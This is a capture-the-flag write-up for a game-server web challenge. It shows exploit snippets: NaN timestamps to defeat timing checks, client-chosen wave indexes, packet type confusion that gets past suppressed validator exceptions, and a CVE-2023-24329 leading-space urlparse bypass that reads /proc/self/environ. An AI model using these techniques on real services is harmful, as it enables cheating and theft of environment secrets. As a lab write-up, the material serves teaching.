# Writeup

In this challenge, challengers would have to find not just stupid and boring web vulnerabilities but also read a lot of sources to understand how this stuff is built and what parts are vulnerable.


## Goal
The goal here is to unlock all achievements, which are basically
```python
    Achievement(name='kill 1 mob', condition=lambda x: x.total_mobs_killed >= 1),
    Achievement(name='kill 5 mobs', condition=lambda x: x.total_mobs_killed >= 5),
    Achievement(name='kill 100 mobs', condition=lambda x: x.total_mobs_killed >= 100),

    Achievement(name='unlock level 2', condition=lambda x: x.level >= 2),
    Achievement(name='unlock level 5', condition=lambda x: x.level >= 5),
    Achievement(name='unlock level 75', condition=lambda x: x.level >= 75),

    Achievement(name='survive 5 waves', condition=lambda x: x.wave_number >= 5),
    Achievement(name='survive 50 waves', condition=lambda x: x.wave_number >= 50),
    Achievement(name='survive 150 waves', condition=lambda x: x.wave_number >= 150),

    Achievement(name='unlock all items', condition=lambda x: len(x.inventory) >= ITEMS_COUNT),

    Achievement(name='cheater!', condition=lambda x: x.is_cheater),
```

Easy enough, right? But the problem here is that whenever the server generates a new wave of mobs, it could include an invincible mob, and whenever you kill this mob, you cannot pass the wave.

```python
        if len(wave_info.mobs.enemies) != len(message.mobs):
            session.log_critical('Attempted to send invalid wave end message. len(enemies) != mobs_killed')

        if wave_info.mobs.contains_invincible_enemies:
            session.log_critical('Attempted to clear wave with an invincible mob!')
```

## Solving

To bypass the invincible mob check and wave timing checks, you could always send the wave number 1 and set all the times to NaN.

For the invincible check, the vulnerable part of the wave handler is 

```diff
    if session.game.wave_number > 0:
        if message.number > len(session.game.waves):
            return message

+        wave_info = session.game.waves[message.number - 1]

        if len(wave_info.mobs.enemies) != len(message.mobs):
            session.log_critical('Attempted to send invalid wave end message. len(enemies) != mobs_killed')

        if wave_info.mobs.contains_invincible_enemies:
            session.log_critical('Attempted to clear wave with an invincible mob!')
```

Essentially, to get the wave information, it uses the wave index passed from the client, so if we spam with wave number one, 
it would always get first-wave info, and since there would be no invincible mobs, the checks would pass.

As for the timing checks, the checks are implemented in this way
```diff
        cleared_in = message.current_time - wave_info.started_at_user_time
        min_clearance_time = (min_wave_clearance_time(
            sum([x.health for x in wave_info.mobs.enemies]), session.game.level
        ) * 1e3)
        min_clearance_time -= WAVE_REMOTE_CLEARANCE_WINDOW

+        if cleared_in < min_clearance_time:
            session.log_critical(f'Cleared wave too quickly ({cleared_in} vs {min_clearance_time} diff '
                                 f'{min_clearance_time - cleared_in})')

        cleared_in_local: float = time() - wave_info.started_at_local_time
        cleared_in_local -= WAVE_CLEARANCE_WINDOW
        cleared_in_local *= 1e3
+        if cleared_in_local > cleared_in:
            session.log_critical(f'Cleared wave too quickly #2 ({cleared_in_local} vs {cleared_in})')
```

But since we pass NaN, the subtraction operation will produce a NaN, and when you compare NaN with a number, it will always
return False.

So for the level, XP, and mob achievements, all we have to do is:
```python
send_msg(EPacketType.WAVE, proto.Wave(number=0, mobs=[], current_time=nan))

first_wave = wave_info

for m in first_wave.mobs:
    if m.invincible:
        print('goddamn, unlucky!')
        exit()

first_wave.number = 1
first_wave.current_time = nan

for i in range(150):
    send_msg(EPacketType.WAVE, first_wave)

send_msg(EPacketType.LEVEL_UP, proto.CLevelUp(item=13371337))
```

Next, we have the `unlock all items` achievement.

The first vulnerability to giving the items is that there is no check whether you are equipping an item you picked up from the mob.
To exploit it we can just send a message about equipping an item `rare item`.

```python
send_msg(EPacketType.INVENTORY_EQUIP, proto.CInventoryEquip(item=proto.ItemDetail(
    name='ultra rare item',
    damage=0,
    icon=''
)))
```

But! The thing is that the amount with which the application compares your inventory size is 6, and you can give yourself 
only 1 item.

The second vulnerability here is that when invoking handler validators, there's a `@logger.catch` on the invoking function.
```python
@logger.catch
async def _call_validator(handler: MessageHandler, session: Session, data: TMessageProto) -> bool:
    if handler.validator_callback is None:
        return True
    return await handler.validator_callback(session, data)


async def _call_dispatcher(handler: MessageHandler, session: Session, data: TMessageProto) -> TMessageProto:
    assert handler.dispatcher_callback is not None
    return await handler.dispatcher_callback(session, data)


async def call_message_handlers(session: Session, message: Message, data: TMessageProto) -> TMessageProto:
    result: TMessageProto = SPing()  # type: ignore

    for handler in registered_handlers[message.packet_type]:
        if await _call_validator(handler, session, data) is False:
            assert handler.reject_value is not None
            result = handler.reject_value
            continue

        result = await _call_dispatcher(handler, session, data)

    return result
```

Because of that, whenever an exception occurs within the validator, the exception is suppressed, and the function will 
return `None`.

And because the `call_message_handlers` function validates result of this function by comparing it `is False`, the 
`None` value here will pass.

If we take a look at the item pick-up validator, we can see this:
```python
@handler.validator()
async def on_inventory_equip_validator(session: Session, message: CInventoryEquip) -> bool:
    if message.item.name in [x.name for x in session.game.inventory]:
        return False

    return True
```

To make it throw an exception here, we can abuse the type confusion vulnerability in the protocol(tldr there are two packet 
identifiers, one for dispatcher and one for packet struct).

However, we need to pick a packet with an `item` attribute because the dispatcher needs it.

```python
for i in range(6):
    send_msg(EPacketType.INVENTORY_EQUIP, proto.CLevelUp(item=1))
```

OK wonderful, the only achievement left is `cheater !`.

If we take a look at how you can get it, there's a handler `RESOURCE`.

```python
@lru_cache(maxsize=128)
def request_url(url: str) -> bytes:
    return urlopen(url).read()


DEFAULT = request_url(f'http://127.0.0.1:{config.CDN_PORT}/default.png')


@handler.dispatcher()
async def on_resource_request(session: Session, msg: CRequestResource) -> SRequestResource:
    result = SRequestResource(item=DEFAULT, success=False)

    try:
        msg_item = msg.item.split('?')[0]
        info = urlparse(msg_item)
    except Exception as e:  # noqa
        return result

    if info.scheme in ['file']:
        return result

    try:
        data = request_url(msg_item)
        if b'cr3{' in data:
            session.game.is_cheater = True
            session.log_warn('Cheater!')
        result.success = True
    except Exception:  # noqa
        pass

    return result
```

The fun thing about this handler is that I was too lazy to implement this logic in the frontend, so basically, the frontend 
normally doesn't even communicate with the server using this packet.

The second fun thing about this handler is that the docker image is based on `python:3.10.0-slim-buster`; this version has 
an unpatched CVE `CVE-2023-24329`.

We can exploit this vulnerability to read the env and get the cheater's achievement.
```python
send_msg(EPacketType.RESOURCE, CRequestResource(
    item=f' file:///proc/self/environ'
))
```

Or, you can also use the data:// URI, that works too.

that's it
